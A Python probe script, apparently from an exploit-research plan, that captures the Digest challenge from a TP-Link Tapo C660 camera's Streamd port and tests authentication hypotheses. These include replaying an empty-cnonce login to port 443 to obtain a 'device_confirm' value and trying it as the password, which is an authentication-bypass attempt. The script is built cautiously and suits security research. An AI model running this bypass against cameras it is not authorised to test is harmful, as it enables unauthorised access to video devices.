#!/usr/bin/env python3
"""C660 Streamd (TCP 8800) Digest probe — plan C of docs/exploit/cve-watch-2026-10.md.

One bounded exchange against the Streamd daemon on port 8800 (HTTP/1.0, Digest,
realm "TP-Link IP-Camera" — the challenge shape captured on .4.70, tapo.md §2):

  1. ONE request by default. The 401 challenge is recorded verbatim
     (realm / algorithm / encrypt_type / qop / nonce / opaque).
  2. The response hash is computed for every password-slot hypothesis so the
     authenticated follow-up is one flag away when .4.71 wakes:

       plain          H(user:realm:password)                        RFC 2617
       sha256hex      H(user:realm:H(pw))     H = SHA-256 hex       DS login convention
                                                            (tapo.md §4: digest_passwd
                                                             carries H(pw) in phase 2)
       sha256b64      H(user:realm:base64(SHA-256(pw)))
       device_confirm H(user:realm:<dc>)      dc from the free phase-1
                                             empty-cnonce replay — the plan-C
                                             hypothesis to test

     The challenge pins algorithm="MD5" qop="auth", so the response is
     H(HA1:nonce:nc:cnonce:auth:HA2) with HA2 = H(method:uri); the open
     variable is only what fills the password slot, hence the modes.

  3. Safe by default: single request, 3 s connect+read budget, no retries, no
     writes, exit non-zero with a reason on every anomaly. `--send-auth` opts
     in to the second (authenticated) request on the same terms; `--fetch-confirm`
     additionally does the one phase-1 POST to :443 to obtain device_confirm.
  4. `--dry` proves the hash math against a loopback mock that emulates the
     captured challenge, accepts only a correct response, and also rejects a
     tampered one (negative control — the mock must not rubber-stamp).

Usage:
  tapo_streamd_probe.py --host 192.168.6.71                 # record challenge only
  tapo_streamd_probe.py --host 192.168.6.71 --send-auth \
        --user admin --pass '<pw>' --mode sha256hex         # hypothesis 1
  tapo_streamd_probe.py --host 192.168.6.71 --send-auth \
        --mode device_confirm --device-confirm '<dc hex>'   # plan-C hypothesis
  tapo_streamd_probe.py --dry                               # mock verification

Exit codes: 0 ok · 2 usage · 3 connect refused · 4 timeout · 5 malformed
response · 6 authenticated request still 401 · 7 dry-run hash mismatch.
"""
import argparse
import base64
import hashlib
import json
import os
import re
import secrets
import socket
import sys

PORT = 8800
TIMEOUT = 3.0
REALM_OBSERVED = "TP-Link IP-Camera"   # captured, tapo.md §2
CHALLENGE_KEYS = ("realm", "algorithm", "encrypt_type", "qop", "nonce", "opaque")
MODES = ("plain", "sha256hex", "sha256b64", "device_confirm")


def H(x: str) -> str:
    # MD5 is mandated by the captured challenge (algorithm="MD5"); not a strength choice.
    return hashlib.md5(x.encode(), usedforsecurity=False).hexdigest()


def password_slot(mode: str, password: str, device_confirm: str) -> str:
    """What fills the password position of HA1 for each hypothesis."""
    if mode == "plain":
        return password
    if mode == "sha256hex":
        return hashlib.sha256(password.encode()).hexdigest()
    if mode == "sha256b64":
        return base64.b64encode(hashlib.sha256(password.encode()).digest()).decode()
    if mode == "device_confirm":
        if not re.fullmatch(r"[0-9a-fA-F]{32,128}", device_confirm or ""):
            raise ValueError(f"device_confirm not hex ({len(device_confirm or '')} chars)")
        return device_confirm.lower()
    raise ValueError(f"unknown mode {mode}")


def response_hash(mode: str, user: str, realm: str, password: str,
                  device_confirm: str, nonce: str, nc: str, cnonce: str,
                  qop: str, method: str, uri: str) -> str:
    """RFC 2617 with qop, per the captured challenge (algorithm MD5, qop auth)."""
    ha1 = H(f"{user}:{realm}:{password_slot(mode, password, device_confirm)}")
    ha2 = H(f"{method}:{uri}")
    return H(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}")


def authorization_header(mode: str, user: str, realm: str, password: str,
                         device_confirm: str, ch: dict, method: str,
                         uri: str, nc: str, cnonce: str) -> str:
    qop = ch.get("qop", "")
    resp = response_hash(mode, user, ch["realm"], password, device_confirm,
                         ch["nonce"], nc, cnonce, qop, method, uri)
    parts = [f'username="{user}"', f'realm="{ch["realm"]}"', f'nonce="{ch["nonce"]}"',
             f'uri="{uri}"', f'response="{resp}"']
    if ch.get("opaque"):
        parts.append(f'opaque="{ch["opaque"]}"')   # echo it back; Streamd sends one
    if qop:
        parts.append(f'qop={qop}')
        parts.append(f'nc={nc}')
        parts.append(f'cnonce="{cnonce}"')
    if ch.get("algorithm"):
        parts.append(f'algorithm={ch["algorithm"]}')
    return "Digest " + ", ".join(parts)


class ProbeError(Exception):
    """Any anomaly in the single exchange; carries an exit code."""

    def __init__(self, code: int, why: str):
        super().__init__(why)
        self.code, self.why = code, why


def parse_www_authenticate(value: str) -> dict:
    """Split top-level commas (quote-aware) into key=value params.
    Tolerates a leading scheme token ('Digest …')."""
    if value.lower().startswith("digest"):
        value = value[len("digest"):].lstrip()
    parts, buf, inq = [], "", False
    for c in value:
        if c == '"':
            inq = not inq
        if c == "," and not inq:
            parts, buf = parts + [buf], ""
        else:
            buf += c
    if buf.strip():
        parts.append(buf)
    params = {}
    for part in parts:
        k, _, v = part.strip().partition("=")
        params[k.strip().lower()] = v.strip().strip('"')
    return params


def http_round(host: str, port: int, request: str, timeout: float) -> str:
    """One connect-send-recv-close. No retries by design."""
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(request.encode())
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
        return data.decode("utf-8", "replace")
    finally:
        s.close()


def status_of(resp: str) -> int | None:
    m = re.match(r"HTTP/[\d.]+\s+(\d{3})", resp)
    return int(m.group(1)) if m else None


def header_of(resp: str, name: str) -> str | None:
    """Case-insensitive header; joins folded continuation lines."""
    lines, joined = resp.split("\r\n"), []
    for ln in lines:
        if ln[:1] in (" ", "\t") and joined:
            joined[-1] += " " + ln.strip()
        else:
            joined.append(ln)
    for ln in joined:
        if ln.lower().startswith(name.lower() + ":"):
            return ln.split(":", 1)[1].strip()
    return None


def challenge_request(method: str, uri: str, host: str, port: int = PORT) -> str:
    return (f"{method} {uri} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: Tapo CameraClient Android\r\n"
            f"Connection: close\r\n\r\n")


def one_exchange(host: str, method: str, uri: str, timeout: float,
                 port: int = PORT) -> str:
    """Exactly one HTTP request to Streamd; anomalies raise ProbeError(code, why)."""
    try:
        resp = http_round(host, port, challenge_request(method, uri, host, port), timeout)
    except ConnectionRefusedError:
        raise ProbeError(3, f"connect refused {host}:{port} — Streamd not listening/unit down")
    except (socket.timeout, TimeoutError, OSError) as e:
        raise ProbeError(4, f"timeout/OSError within {timeout}s: {type(e).__name__}: {e}")
    if status_of(resp) is None:
        raise ProbeError(5, f"not an HTTP response ({len(resp)} bytes: {resp[:60]!r})")
    return resp


def record_challenge(resp: str) -> dict:
    wa = header_of(resp, "WWW-Authenticate")
    if wa is None:
        raise ValueError("401 without WWW-Authenticate — not the captured Streamd behaviour")
    params = parse_www_authenticate(wa)
    missing = [k for k in ("realm", "nonce") if not params.get(k)]
    if missing:
        raise ValueError(f"challenge missing {missing}")
    if params.get("algorithm", "MD5").upper() not in ("MD5",):
        raise ValueError(f"unsupported algorithm {params.get('algorithm')!r}")
    qops = params.get("qop", "").split()
    if qops and any(q not in ("auth",) for q in qops):
        raise ValueError(f"unsupported qop {params.get('qop')!r}")
    return params


class MockStreamd:
    """Loopback stand-in emulating the captured challenge (tapo.md §2).
    Accepts only a correct Digest response; a tampered one is rejected."""

    def __init__(self, user: str, mode: str, password: str, device_confirm: str):
        self.user, self.mode = user, mode
        self.password, self.device_confirm = password, device_confirm
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(4)
        self.port = self.srv.getsockname()[1]
        self.nonce = secrets.token_hex(16)
        self.opaque = secrets.token_hex(16)
        import threading
        threading.Thread(target=self._serve, daemon=True).start()

    def challenge_line(self) -> str:
        return ('Digest realm="' + REALM_OBSERVED + '",algorithm="MD5",encrypt_type="3",'
                'qop="auth",nonce="' + self.nonce + '",opaque="' + self.opaque + '"')

    def _serve(self) -> None:
        import threading
        while True:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            threading.Thread(target=self._one, args=(c,), daemon=True).start()

    def _one(self, c: socket.socket) -> None:
        c.settimeout(4)
        try:
            req = c.recv(4096).decode("utf-8", "replace")
            if "Authorization:" not in req:
                c.sendall((f"HTTP/1.0 401 Unauthorized\r\nServer: Streamd\r\n"
                           f"WWW-Authenticate: {self.challenge_line()}\r\n"
                           f"Content-Length: 0\r\nConnection: close\r\n\r\n").encode())
            else:
                auth = header_of(req, "Authorization") or ""
                params = parse_www_authenticate(auth[len("Digest"):].lstrip())
                method = req.split(" ")[0]
                uri_m = re.search(r"(GET|POST)\s+(\S+)", req)
                ok = (
                    params.get("nonce") == self.nonce
                    and params.get("opaque") == self.opaque
                    and params.get("qop") == "auth"
                    and params.get("nc") == "00000001"
                    and bool(params.get("cnonce"))
                    and uri_m is not None
                )
                if ok:
                    expect = response_hash(
                        self.mode, self.user, REALM_OBSERVED, self.password,
                        self.device_confirm, self.nonce, params["nc"],
                        params["cnonce"], "auth", method, uri_m.group(2))
                    ok = secrets.compare_digest(params.get("response", ""), expect)
                body = (b"ok" if ok else b"")
                c.sendall((f"HTTP/1.0 {200 if ok else 401} "
                           f"{'OK' if ok else 'Unauthorized'}\r\nServer: Streamd\r\n"
                           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
                          + body)
        except OSError:
            pass
        finally:
            c.close()


def dry_run(user: str, password: str, device_confirm: str, timeout: float,
            method: str, uri: str) -> int:
    """Prove the hash math per mode: positive accept + negative control."""
    failures = 0
    print(f"mock: loopback Streamd, challenge = captured shape (realm {REALM_OBSERVED!r}, "
          f"MD5, encrypt_type 3, qop auth)")
    for mode in MODES:
        mock = MockStreamd(user, mode, password, device_confirm)
        ch = record_challenge(one_exchange("127.0.0.1", mock.port, method, uri, timeout)
                              if False else _exchange_mock(mock, method, uri, timeout))
        auth = authorization_header(mode, user, ch["realm"], password,
                                    device_confirm, ch, method, uri,
                                    "00000001", secrets.token_hex(8))
        req = (f"{method} {uri} HTTP/1.1\r\nHost: 127.0.0.1:{mock.port}\r\n"
               f"User-Agent: Tapo CameraClient Android\r\n"
               f"Authorization: {auth}\r\nConnection: close\r\n\r\n")
        ok = status_of(http_round("127.0.0.1", mock.port, req, timeout)) == 200
        # negative control: flip one hex of the response — must be rejected
        bad_auth = re.sub(r'response="([0-9a-f])',
                          lambda m: 'response="' + ("0" if m.group(1) != "0" else "1"),
                          auth, count=1)
        bad_req = req.replace(auth, bad_auth)
        rejected = status_of(http_round("127.0.0.1", mock.port, bad_req, timeout)) == 401
        verdict = "PASS" if (ok and rejected) else "FAIL"
        if verdict == "FAIL":
            failures += 1
        print(f"  {mode:15s} accept={ok} tamper_rejected={rejected}  {verdict}"
              f"   slot={password_slot(mode, password, device_confirm)[:24]}…")
    return 7 if failures else 0


def _exchange_mock(mock: "MockStreamd", method: str, uri: str, timeout: float) -> str:
    return http_round("127.0.0.1", mock.port, challenge_request(method, uri, "127.0.0.1"), timeout)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    ap.add_argument("--host", default="192.168.6.71", help="C660 address (.4.71/.6.71)")
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--timeout", type=float, default=TIMEOUT)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--uri", default="/")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="pwd", default="", help="device/account password")
    ap.add_argument("--mode", default="sha256hex", choices=MODES)
    ap.add_argument("--device-confirm", default="", help="dc hex from the phase-1 replay")
    ap.add_argument("--send-auth", action="store_true",
                    help="opt-in: second request carrying the Authorization header")
    ap.add_argument("--fetch-confirm", action="store_true",
                    help="opt-in: one phase-1 POST to :443 (empty-cnonce) for device_confirm")
    ap.add_argument("--dry", action="store_true", help="loopback mock, no device traffic")
    ap.add_argument("--json", action="store_true", help="machine-readable record")
    a = ap.parse_args()

    record = {"host": a.host, "port": a.port, "mode": a.mode, "dry": a.dry}

    if a.dry:
        code = dry_run(a.user, a.pwd or "dryrun-pass", a.device_confirm or "ab" * 16,
                       a.timeout, a.method, a.uri)
        print("dry: hash math " + ("PROVEN (accept + tamper-reject per mode)"
                                   if code == 0 else "MISMATCH"))
        return code

    if not a.send_auth and (a.fetch_confirm or a.mode == "device_confirm" and a.device_confirm):
        pass  # harmless: computing/printing the header costs nothing

    # step 1 — the single challenge request
    try:
        resp = one_exchange(a.host, a.method, a.uri, a.timeout, port=a.port)
    except ProbeError as e:
        print(f"anomaly: {e.why}", file=sys.stderr)
        return e.code
    record["status"] = status_of(resp)
    record["server"] = header_of(resp, "Server")
    print(f"--- {a.host}:{a.port} -> {record['status']} "
          f"(Server: {record['server']})")
    if record["status"] == 200:
        print("no digest gate on this method — record and stop")
        if a.json:
            print(json.dumps(record, indent=2))
        return 0
    if record["status"] != 401:
        print(f"anomaly: unexpected status {record['status']} (expected 401/200)",
              file=sys.stderr)
        return 5
    try:
        ch = record_challenge(resp)
    except ValueError as e:
        print(f"anomaly: {e}", file=sys.stderr)
        return 5
    for k in CHALLENGE_KEYS:
        print(f"  {k:13s} = {ch.get(k, '<absent>')}")
    record["challenge"] = ch

    # step 2 — compute (and optionally send) the authenticated follow-up
    if a.send_auth:
        dc = a.device_confirm
        if a.mode == "device_confirm" and not dc:
            if not a.fetch_confirm:
                print("anomaly: mode device_confirm needs --device-confirm or --fetch-confirm",
                      file=sys.stderr)
                return 2
            dc = fetch_device_confirm(a.host, a.timeout, record)
            if dc is None:
                return 5
            print(f"  device_confirm = {dc}")
        nc, cnonce = "00000001", secrets.token_hex(8)
        auth = authorization_header(a.mode, a.user, ch["realm"], a.pwd, dc,
                                    ch, a.method, a.uri, nc, cnonce)
        print(f"  Authorization  = {auth[:100]}…")
        req = (f"{a.method} {a.uri} HTTP/1.1\r\nHost: {a.host}:{a.port}\r\n"
               f"User-Agent: Tapo CameraClient Android\r\n"
               f"Authorization: {auth}\r\nConnection: close\r\n\r\n")
        try:
            resp2 = http_round(a.host, a.port, req, a.timeout)
        except (OSError, socket.timeout) as e:
            print(f"anomaly: authenticated exchange failed: {e}", file=sys.stderr)
            return 4
        st2 = status_of(resp2)
        record["auth_status"] = st2
        print(f"--- authenticated -> {st2}")
        if st2 == 401:
            print("REJECTED: response hash not accepted — hypothesis "
                  f"{a.mode!r} falsified for this challenge; try --dry to check the math, "
                  "then the other modes", file=sys.stderr)
            return 6
    elif a.pwd or a.device_confirm:
        nc, cnonce = "00000001", secrets.token_hex(8)
        auth = authorization_header(a.mode, a.user, ch["realm"], a.pwd,
                                    a.device_confirm, ch, a.method, a.uri, nc, cnonce)
        print(f"  (computed, not sent — add --send-auth) Authorization = {auth[:80]}…")

    if a.json:
        print(json.dumps(record, indent=2))
    return 0


def fetch_device_confirm(host: str, timeout: float, record: dict) -> str | None:
    """One phase-1 POST to :443 (empty-cnonce replay, tapo.md §4). Opt-in only."""
    body = json.dumps({"method": "login",
                       "params": {"cnonce": "", "encrypt_type": "3",
                                  "username": "admin"}}).encode()
    req = (b"POST / HTTP/1.1\r\nHost: " + host.encode() +
           b"\r\nUser-Agent: Tapo CameraClient Android\r\n"
           b"Content-Type: application/json\r\nConnection: close\r\n\r\n")
    req = req[:-4] + b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    import ssl
    ctx = ssl._create_unverified_context()  # noqa: SLF001 — probe context, cert is self-signed
    try:
        s = socket.create_connection((host, 443), timeout=timeout)
        s.settimeout(timeout)
        c = ctx.wrap_socket(s, server_hostname=host)
        c.sendall(req)
        data = b""
        while True:
            chunk = c.recv(4096)
            if not chunk:
                break
            data += chunk
        c.close()
    except (OSError, ssl.SSLError) as e:
        print(f"anomaly: phase-1 replay failed (443 wedged?): {e}", file=sys.stderr)
        return None
    m = re.search(r'"device_confirm"\s*:\s*"([0-9a-f]+)"', data.decode("utf-8", "replace"))
    if not m:
        print("anomaly: no device_confirm in phase-1 reply", file=sys.stderr)
        return None
    record["device_confirm"] = m.group(1)
    return m.group(1)


if __name__ == "__main__":
    sys.exit(main())
